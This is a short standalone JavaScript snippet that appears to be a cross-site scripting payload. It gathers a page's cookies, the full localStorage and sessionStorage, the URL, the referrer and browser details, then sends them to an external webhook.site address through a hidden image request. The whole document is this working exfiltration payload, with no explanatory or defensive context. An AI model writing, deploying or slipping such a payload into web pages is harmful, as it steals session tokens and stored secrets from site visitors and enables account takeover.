(() => {
  const data = {
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    href: location.href,
    referrer: document.referrer,
    userAgent: navigator.userAgent,
    lang: navigator.language,
    time: new Date().toISOString()
  };

  const img = new Image();
  img.src = `https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de?d=${encodeURIComponent(JSON.stringify(data))}`;
})();
